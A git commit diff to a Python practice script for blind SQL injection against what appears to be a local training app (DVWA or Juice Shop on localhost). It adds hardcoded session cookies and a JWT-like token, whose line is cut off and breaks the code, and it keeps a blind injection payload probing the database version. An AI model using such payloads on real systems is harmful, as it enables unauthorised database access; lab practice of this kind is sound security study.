5ccb989990ed83ad4a4b01e7a045596740d0c2e6
Gourav Singh <49956754+GouravSingh2580@users.noreply.github.com>
2022-06-29 02:09:05 +0530

    Update automate.py

--- sql-injection/automate.py
+++ sql-injection/automate.py
@@ -2,6 +2,15 @@ import requests
 import urllib.parse
 
 URL='http:// localhost:4444/vulnerabilities/sqli_blind/?id=%s&Submit=Submit'
+
+cookies={
+    'language':'en',
+    'PHPSESSID':'1smr2cbr9j9ji81gg6ajvjjbs4',
+    'token':'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUZI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJ1bWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdi YmQ3MzI1MD
+    'security':'low',
+    'continueCode':'KQabVVENkBvjq902xgyoWrXb45wGnmTxdaL8m1pzY1PQKJMZ6D37neRqyn3x',
+}
+
 query="' AND SUBSTRING(version(),1,1)='1'#"
 query= urllib.parse.quote_plus(query)
 
